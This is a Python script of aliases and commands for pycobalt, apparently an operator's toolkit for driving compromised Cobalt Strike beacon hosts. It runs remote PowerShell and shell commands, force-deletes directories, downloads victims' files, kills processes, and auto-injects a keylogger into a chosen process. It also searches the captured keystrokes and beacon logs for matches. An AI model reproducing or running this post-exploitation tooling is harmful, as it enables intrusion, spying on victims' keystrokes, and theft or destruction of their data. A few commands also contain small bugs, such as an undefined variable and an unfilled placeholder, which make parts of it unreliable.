#!/usr/bin/env python3

# so we can use the repo copy of pycobalt
import sys
import os
sys.path.insert(0, os.path.realpath(os.path.dirname(__file__)) + '/..')

import re
import textwrap
import datetime
import collections

import pycobalt.engine as engine
import pycobalt.events as events
import pycobalt.aliases as aliases
import pycobalt.helpers as helpers
import pycobalt.commands as commands
import pycobalt.aggressor as aggressor
import pycobalt.callbacks as callbacks

@aliases.alias('pp', 'Alias for powerpick')
def _(bid, *args):
    command = ' '.join(args)
    aggressor.bpowerpick(bid, command)

@aliases.alias('psh', 'Alias for powershell')
def _(bid, *args):
    command = ' '.join(args)
    aggressor.bpowershell(bid, command)

@aliases.alias('s', 'Alias for shell')
def _(bid, *args):
    command = ' '.join(args)
    aggressor.bshell(bid, command)

@aliases.alias('lsr', 'Recursively list files')
def _(bid, *dirs):
    # default dir is .
    if not dirs:
        dirs = ['.']

    command = ''
    for d in dirs:
        command += 'Get-ChildItem -Recurse "{}"\n'.format(d)

    aggressor.bpowerpick(bid, command)

@aliases.alias('rmr', 'Recursively delete files and directories')
def _(bid, *dirs):
    if not dirs:
        aggressor.berror('rmr: specify some directories to kill')
        return

    command = ''
    for d in dirs:
        command += 'Remove-Item -Recurse -Force "{}"\n'.format(d)
    
    aggressor.bpowerpick(bid, command)

@aliases.alias('cat', 'View files')
def _(bid, *files):
    if not files:
        aggressor.berror('cat: specify some files to cat')
        return

    command = '\n'.join(['type {}'.format(f) for f in files])

    aggressor.bshell(bid, command)

@aliases.alias('dl', 'Download a file')
def _(bid, *args):
    fname = ' '.join(args)
    aggressor.bdownload(bid, fname)

@aliases.alias('df', 'Show filesystem info')
def _(bid):
    aggressor.bpowerpick(bid, 'Get-PSDrive')

@aliases.alias('drive-list', 'Run ls in each drive')
def _(bid):
    aggressor.btask(bid, 'Tasked beacon to list files at root of each drive')
    aggressor.bpowerpick(bid, 'Get-PSDrive -PSProvider Filesystem | ForEach-Object { ls $_.root; }')

@aliases.alias('readlink', 'Show .lnk location and arguments')
def _(bid, *lnks):
    command = '$sh = New-Object -ComObject WScript.Shell'

    for lnk in lnks:
        command += textwrap.dedent(r"""
            $shortcut = $sh.CreateShortcut({})
            #$target = $shortcut.TargetPath
            #$arguments = $target.Arguments
            #echo "$target $arguments"
            echo "$shortcut.TargetPath $target.Arguments"
            """.format(powershell_quote(lnk)))

    aggressor.btask(bid, 'Tasked beacon to read links: {}'.format(', '.join(lnks)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('pb', 'Open process browser')
def _(bid):
    aggressor.openProcessBrowser(bid)

@aliases.alias('info', 'Show beacon info')
def _(bid):
    out = "Beacon info:\n\n"
    for key, value in aggressor.beacon_info(bid).items():
        out += ' - {}: {}\n'.format(key, value)

    aggressor.blog2(bid, out)

@aliases.alias('loaded', 'Show loaded powershell modules')
def _(bid):
    loaded = aggressor.data_query('cmdlets')
    if bid in loaded:
        out = 'Loaded modules:\n'
        for module in loaded[bid]:
            if module.lower() in ['local', 'that', 'struct', 'field', 'before',
                                  'psenum', 'func', '']:
                # not sure what these are
                continue

            out += ' - {}\n'.format(module)

        aggressor.blog2(bid, out)
    else:
        aggressor.berror(bid, 'No loaded modules')

jobkillall_items = collections.defaultdict(list)

@events.event('beacon_output_jobs')
def jobkillall_callback(bid, text, when):
    global jobkillall_items

    jobs = helpers.parse_jobs(text)

    if bid not in jobkillall_items:
        # doesn't concern us
        return

    for job in jobs:
        for item in jobkillall_items[bid]:
            if not item or item.lower() in job['description'].lower():
                # kill it
                aggressor.blog2(bid, 'Killing job: {} (JID {}) (PID {})'.format(job['description'], job['jid'], job['pid']))
                aggressor.bjobkill(bid, job['jid'])
                break

    del jobkillall_items[bid]

@aliases.alias('jobkillall', 'Kill all jobs matching a description (or all jobs)')
def _(bid, description=None):
    global jobkillall_items

    if bid not in jobkillall_items:
        # trigger jobs command
        aggressor.bjobs(bid)

    jobkillall_items[bid].append(description)

@aliases.alias('killall')
def _(bid, proc_name):
    def callback(procs):
        if procs:
            for proc in procs:
                out = 'Killing {}: {}'.format(proc_name, proc['pid'])
                if 'arch' in proc:
                    out += ' ({})'.format(proc['arch'])
                if 'user' in proc:
                    out += ' ({})'.format(proc['user'])
                aggressor.blog2(bid, out)

                aggressor.bkill(bid, proc['pid'])
        else:
            aggressor.berror(bid, 'No processes named {}'.format(proc_name))

    aggressor.blog2(bid, 'Tasked beacon to kill processes named {}'.format(proc_name))
    helpers.find_process(bid, proc_name, callback)

@aliases.alias('pgrep')
def _(bid, proc_name):
    def callback(procs):
        if procs:
            for proc in procs:
                out = 'Found {}: {}'.format(proc_name, proc['pid'])
                if 'arch' in proc:
                    out += ' ({})'.format(proc['arch'])
                if 'user' in proc:
                    out += ' ({})'.format(proc['user'])
                aggressor.blog2(bid, out)
        else:
            aggressor.berror(bid, 'No processes named {}'.format(proc_name))

    aggressor.blog2(bid, 'Tasked beacon to search for processes named {}'.format(proc_name))
    helpers.find_process(bid, proc_name, callback)

@aliases.alias('cl', 'Alias for cd; ls; pwd')
def _(bid, *args):
    directory = ' '.join(args)
    aggressor.bcd(bid, directory)
    aggressor.bls(bid)
    aggressor.bpwd(bid, silent=True)

@aliases.alias('l', 'Run ls on multiple directories')
def _(bid, *dirs):
    # default dir is .
    if not dirs:
        dirs = ['.']

    for d in dirs:
        aggressor.bls(bid, d)

@aliases.alias('la', 'Run ls within all subdirectories of a directory')
def _(bid, *dirs):
    # default dir is .
    if not dirs:
        dirs = ['.']

    command = 'ls '
    command += ', '.join([powershell_quote('{}\*\*'.format(d)) for d in dirs])

    aggressor.btask(bid, 'Tasked beacon to list */* in: {}'.format(', '.join(dirs)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('remove', 'Remove this beacon')
def _(bid):
    aggressor.beacon_remove(bid)

@aliases.alias('list-drives', 'Run ls in each drive')
def _(bid):
    aggressor.bpowerpick(bid, 'get-psdrive -psprovider filesystem | foreach-object { ls $_.root; }')

@aliases.alias('log', 'Display message on beacon console')
def _(bid, *args):
    msg = ' '.join(args)
    aggressor.blog(bid, msg)

@aliases.alias('log2', 'Display message on beacon console')
def _(bid, *args):
    msg = ' '.join(args)
    aggressor.blog2(bid, msg)

@aliases.alias('error', 'Display error on beacon console')
def _(bid, *args):
    msg = ' '.join(args)
    aggressor.berror(bid, msg)

@aliases.alias('estomp')
def _(bid, fname):
    helpers.explorer_stomp(bid, fname)

@aliases.alias('uploadto', 'Upload file to a specified location')
def _(bid, local_file, remote_file):
    helpers.upload_to(bid, local_file, remote_file)

@aliases.alias('lt', 'List files, sorted by time')
def _(bid, *dirs):
    # default dir is .
    if not dirs:
        dirs = ['.']

    command = ''
    for d in dirs:
        command += textwrap.dedent(r"""
            Get-ChildItem -Path '{}' |
            Sort-Object LastWriteTime -Descending;
            """.format(d))

    aggressor.bpowerpick(bid, command)

@aliases.alias('find', 'Find a file', 'See `find -h`')
def _(bid, *args):
    parser = helpers.ArgumentParser(bid=bid, prog='find')
    parser.add_argument('-n', '--name', action='append', help='Name to match')
    parser.add_argument('-i', '--iname', action='append', help='Name to match (case insensitive)')
    parser.add_argument('--not', dest='not_', action='store_true', help='Invert --name and --iname')
    parser.add_argument('-d', '--days', type=int, help='Select files no more than DAYS old')
    parser.add_argument('--dirs', action='store_true', help='Include directories')
    parser.add_argument('-o', '--out', help='Output file')
    parser.add_argument('dir', default='.', help='Directory to search from (default: .)')
    try: args = parser.parse_args(args)
    except: return

    command = 'gci -Recurse -Path "{}" 2>$null'.format(args.dir)

    # --dirs
    if not args.dirs:
        command += ' | where { ! $_.PSIsContainer }'

    name_matches = []

    # -n/--name
    if args.name:
        for name in args.name:
            name_matches.append('$_.Name -Clike "{}"'.format(name))

    # -i/--iname
    if args.iname:
        for iname in args.iname:
            name_matches.append('$_.Name -Like "{}"'.format(iname))

    if name_matches:
        where_statement = ' -Or '.join(name_matches)

        # --not
        if args.not_:
            where_statement = '-Not ({})'.format(where_statement)

        command += " | Where-Object { " + where_statement + " }"

    # -d/--days
    if args.days:
        command += ' | ? { $_.LastWriteTime -Ge (Get-Date).AddDays(-{}) }'

    # -o/--out
    if args.out:
        command += ' > "{}"'.format(args.out)

    aggressor.bpowerpick(bid, command)

@aliases.alias('curl', 'Get contents of webpage')
def _(bid, url):
    aggressor.bpowerpick(bid, '(New-Object System.Net.WebClient).DownloadString("{}")'.format(url))

@aliases.alias('headers', 'Get response headers for webpage (sends GET request)')
def _(bid, url):
    command = textwrap.dedent(r"""
        $request = [System.Net.WebRequest]::Create('{}')
        """.format(url))
    command += textwrap.dedent(r"""
        $headers = $request.GetResponse().Headers
        $headers.AllKeys |
             Select-Object @{ Name = "Key"; Expression = { $_ }},
             @{ Name = "Value"; Expression = { $headers.GetValues( $_ ) } }
         """)
    aggressor.bpowerpick(bid, command)

@aliases.alias('host', 'Alias for shell nslookup')
def _(bid, host):
    aggressor.bshell(bid, 'nslookup "{}"'.format(host))

@aliases.alias('home', 'Change to probable home directory')
def _(bid):
    user = aggressor.binfo(bid, 'user')
    home = r'c:\users\{}'.format(user)
    aggressor.bcd(bid, home)

@aliases.alias('pstree', 'Make process tree')
def _(bid):
    def ps_callback(bid, content):
        procs = helpers.parse_ps(content)

        def get_children(pid):
            ret = []
            for proc in procs:
                if proc['ppid'] == pid and proc['pid'] != pid:
                    ret.append(proc)
            return ret

        def get_trunks(procs):
            all_pids = [proc['pid'] for proc in procs]
            ret = []
            for proc in procs:
                if proc['ppid'] not in all_pids or proc['ppid'] == proc['pid']:
                    ret.append(proc)
            return ret

        def make_tree(proc, indent=0):
            # output proc info
            output = ''
            output += ' ' * indent + '{} (pid {})'.format(proc['name'], proc['pid'])
            if 'arch' in proc:
                output += ' (arch {})'.format(proc['arch'])
            if 'user' in proc:
                output += ' (user {})'.format(proc['user'])

            # add app description
            exe = proc['name'].lower() 
            output += '\n'

            # recurse children
            children = get_children(proc['pid'])
            #aggressor.blog2(bid, 'recursing {} children of {}'.format(len(children), str(proc)))
            #aggressor.blog2(bid, str(children))
            for child in children:
                output += make_tree(child, indent + 4)

            return output

        # start with process 0
        tree = ''
        for trunk in get_trunks(procs):
            tree += make_tree(trunk)
        aggressor.blog2(bid, 'Process tree:\n' + tree)

    aggressor.btask(bid, 'Tasked beacon to make a process tree')
    aggressor.bps(bid, ps_callback)

@aliases.alias('windows', 'Show windows')
def _(bid):
    command = textwrap.dedent(r"""
    Get-Process |
        Where { $_.mainWindowTitle } |
        Format-Table id,name,mainwindowtitle -AutoSize
    """)
    
    aggressor.btask(bid, 'Tasked beacon to list open windows')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('autoinject-keylogger', 'Find a suitable process and inject keylogger')
def _(bid, proc_name=None):
    def parsed_callback(procs):
        for proc in procs:
            if 'arch' in proc and 'user' in proc:
                # inject it
                aggressor.blog(bid, 'Keylogging process {} ({} {})'.format(proc['name'], proc['pid'], proc['arch']))
                aggressor.bkeylogger(bid, proc['pid'], proc['arch'], silent=True)
                return

        # nothing found
        if proc_name:
            aggressor.berror("Didn't find any processes named '{}' to inject keylogger".format(proc_name))
        else:
            aggressor.berror("Didn't find any processes to inject keylogger")

    def ps_callback(bid, content):
        procs = helpers.parse_ps(content)
        parsed_callback(procs)

    if proc_name:
        aggressor.blog2(bid, 'Tasked beacon to keylog first accessible process named {}'.format(proc_name))
        helpers.find_process(bid, proc_name, parsed_callback)
    else:
        aggressor.btask(bid, 'Tasked beacon to keylog first accessible process')
        aggressor.bps(bid, ps_callback)

def convert_time(time):
    """
    Convert data model time to pretty time
    """

    return datetime.datetime.utcfromtimestamp(int(str(time)[:-3])).strftime('%Y-%m-%d %H:%M:%S')

def split_output(output):
    """
    Split up a piece of beacon output based on the [+] prefixes.
    """

    lines = output.splitlines()
    ret = []
    current = None
    for line in lines:
        if not current:
            current = line + '\n'

        if line.startswith('[*]') or line.startswith('[+]') or line.startswith('[!]'):
            if current:
                ret.append(current)
            current = line + '\n'
        else:
            current += line + '\n'

    return ret

# Grep keystrokes for a regex
@commands.command('grep-keystrokes')
def _(regex):
    found = False
    engine.message("Searching keystrokes for '{}'".format(regex))
    for frame in aggressor.data_query('keystrokes'):
        data = frame['data']
        bid = frame['bid']
        time = convert_time(frame['when'])
        beacon = '{}@{}'.format(aggressor.beacon_info(bid, 'user'), aggressor.beacon_info(bid, 'computer'))

        for line in data.splitlines():
            if re.search(regex, line, re.IGNORECASE):
                engine.message("Found keystroke matching '{}' from {} at {}: {}".format(regex, beacon, time, line))
                found = True

    if not found:
        engine.error("Didn't find any keystrokes containing '{}'".format(regex))

# Get logs for user or computer
@commands.command('logs')
def _(*args):
    parser = helpers.ArgumentParser(prog='logs', description='Get logs for a user or computer')
    parser.add_argument('-c', '--computer', help='Get logs for computer')
    parser.add_argument('-u', '--user', help='Get logs for user')
    parser.add_argument('out', help='Output file')
    try: args = parser.parse_args(args)
    except: return

    finds = 0
    for frame in aggressor.data_query('beaconlog'):
        output_type = frame[0]
        bid = frame[1]
        if output_type == 'beacon_input':
            user = frame[2]
            data = frame[3]
            time = convert_time(frame[4])
        else:
            data = frame[2]
            time = convert_time(frame[3])

        user = aggressor.beacon_info(bid, 'user')
        computer = aggressor.beacon_info(bid, 'computer')

        if user == args.user or computer == args.computer:
            # it's a match!
            finds += 1

            # -o/--out
            with open(args.out, 'a+') as fp:
                fp.write(data)

    engine.message('Wrote {} finds to {}'.format(finds, args.out))

# Grep beacon logs for a regex
@commands.command('grep-logs')
def _(*args):
    parser = helpers.ArgumentParser(prog='grep-logs', description='Grep beacon logs for a regex')
    parser.add_argument('-o', '--out', help='Output file')
    parser.add_argument('-w', '--whole', action='store_true', help='Show whole output')
    parser.add_argument('regex', action='append', help='Search for regex')
    try: args = parser.parse_args(args)
    except: return

    for regex in args.regex:
        finds = 0
        engine.message("Searching beacon logs for '{}'".format(regex))
        for frame in aggressor.data_query('beaconlog'):
            output_type = frame[0]
            bid = frame[1]
            if output_type == 'beacon_input':
                user = frame[2]
                data = frame[3]
                time = convert_time(frame[4])
            else:
                data = frame[2]
                time = convert_time(frame[3])

            for log in split_output(data):
                if re.search(regex, log, re.IGNORECASE):
                    beacon = '{}@{}'.format(aggressor.beacon_info(bid, 'user'), aggressor.beacon_info(bid, 'computer'))

                    # -w/--whole
                    if args.whole:
                        output = data
                    else:
                        output = log

                    # -o/--out
                    if args.out:
                        with open(args.out, 'a+') as fp:
                            fp.write(output)
                    else:
                        engine.message("Found beacon log matching '{}' from {} at {}:\n{}".format(regex, beacon, time, output))

                    finds += 1

        if finds:
            if args.out:
                engine.message("Wrote {} finds containing '{}' to '{}'".format(finds, regex, args.out))
            else:
                engine.message("Found {} logs containing '{}'".format(finds, regex))
        else:
            engine.error("Didn't find any beacon logs containing '{}'".format(regex))

engine.loop()
